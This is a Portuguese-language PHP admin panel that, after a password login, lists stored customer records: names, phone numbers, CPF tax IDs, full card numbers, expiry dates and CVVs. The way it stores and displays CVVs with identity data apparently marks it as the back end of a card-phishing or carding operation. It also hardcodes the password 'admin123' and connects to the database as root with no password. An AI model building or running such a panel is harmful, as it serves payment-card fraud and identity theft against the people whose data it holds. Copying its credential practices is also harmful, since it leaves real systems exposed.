<?php
session_start();

// =========================================================================
// CONFIGURAÇÃO DE SEGURANÇA (Altera a senha se quiseres)
// =========================================================================
$senha_definida = "admin123"; 

// Trata o Logout
if (isset($_GET['action']) && $_GET['action'] == 'logout') {
    unset($_SESSION['logado']);
    session_destroy();
    header("Location: painel.php");
    exit;
}

// Trata o Login
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['senha'])) {
    if ($_POST['senha'] === $senha_definida) {
        $_SESSION['logado'] = true;
    } else {
        $erro = "Senha incorreta!";
    }
}

// Se não estiver logado, exibe a tela de login estilizada
if (!isset($_SESSION['logado']) || $_SESSION['logado'] !== true) {
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Painel CDT</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #1e293b; margin-bottom: 24px; }
        input[type="password"] { width: 100%; padding: 12px; margin-bottom: 16px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 12px; background-color: #00a868; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #008f58; }
        .erro { color: #ef4444; margin-bottom: 16px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>Painel Administrativo</h2>
        <?php if(isset($erro)) echo "<div class='erro'>$erro</div>"; ?>
        <form method="POST">
            <input type="password" name="senha" placeholder="Digite a senha de acesso" required autofocus>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// =========================================================================
// CONEXÃO E BUSCA DOS DADOS NO BANCO
// =========================================================================
$conexao = new mysqli("localhost", "root", "", "db_cartao");
if ($conexao->connect_error) {
    die("Erro de conexão: " . $conexao->connect_error);
}
$conexao->set_charset("utf8");

// Busca todos os clientes cadastrados (os mais recentes primeiro)
$sql = "SELECT * FROM clientes_cartao ORDER BY id DESC";
$resultado = $conexao->query($sql);
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Geral de Cadastros - CDT</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f8fafc; margin: 0; padding: 20px; color: #334155; }
        .container { max-width: 1400px; margin: 0 auto; }
        .topo { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
        h1 { margin: 0; font-size: 24px; color: #1e293b; }
        .btn-logout { padding: 8px 16px; background-color: #ef4444; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 14px; }
        .btn-logout:hover { background-color: #dc2626; }
        
        .table-responsive { background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); overflow-x: auto; border: 1px solid #e2e8f0; }
        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; min-width: 1100px; }
        th { background-color: #f1f5f9; color: #475569; font-weight: 600; padding: 14px; border-bottom: 2px solid #e2e8f0; }
        td { padding: 14px; border-bottom: 1px solid #e2e8f0; white-space: nowrap; }
        tr:hover { background-color: #f8fafc; }
        
        .badge-pagamento { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .debito { background-color: #dbeafe; color: #1e40af; }
        .credito { background-color: #fef9c3; color: #854d0e; }
        .destaque-cartao { font-family: monospace; font-size: 15px; color: #0f172a; font-weight: bold; }
        .cvv-estilo { background: #e2e8f0; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <div class="topo">
        <h1>💳 Fichas de Cadastro Recebidas (Total: <?php echo $resultado->num_rows; ?>)</h1>
        <a href="painel.php?action=logout" class="btn-logout">Sair do Painel</a>
    </div>

    <div class="table-responsive">
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Nome do Cliente</th>
                    <th>Telefone</th>
                    <th>CPF Pessoal</th>
                    <th>Tipo</th>
                    <th>Número do Cartão</th>
                    <th>Validade</th>
                    <th>CVV</th>
                    <th>Titular do Cartão</th>
                    <th>CPF Cartão</th>
                    <th>E-mail</th>
                </tr>
            </thead>
            <tbody>
                <?php
                if ($resultado->num_rows > 0) {
                    while($row = $resultado->fetch_assoc()) {
                        $classe_badge = ($row['tipo_pagamento'] == 'credito') ? 'credito' : 'debito';
                        echo "<tr>";
                        echo "<td>" . $row['id'] . "</td>";
                        echo "<td><b>" . htmlspecialchars($row['nome']) . "</b></td>";
                        echo "<td>" . htmlspecialchars($row['telefone']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['cpf_pessoal']) . "</td>";
                        echo "<td><span class='badge-pagamento {$classe_badge}'>" . htmlspecialchars($row['tipo_pagamento']) . "</span></td>";
                        echo "<td class='destaque-cartao'>" . htmlspecialchars($row['numero_cartao']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['validade']) . "</td>";
                        echo "<td><span class='cvv-estilo'>" . htmlspecialchars($row['cvv']) . "</span></td>";
                        echo "<td>" . htmlspecialchars($row['nome_cartao']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['cpf_cartao']) . "</td>";
                        echo "<td>" . htmlspecialchars($row['email']) . "</td>";
                        echo "</tr>";
                    }
                } else {
                    echo "<tr><td colspan='11' style='text-align:center; padding: 30px; color: #94a3b8;'>Nenhum cadastro encontrado no banco de dados.</td></tr>";
                }
                ?>
            </tbody>
        </table>
    </div>
</div>

</body>
</html>
<?php
$conexao->close();
?>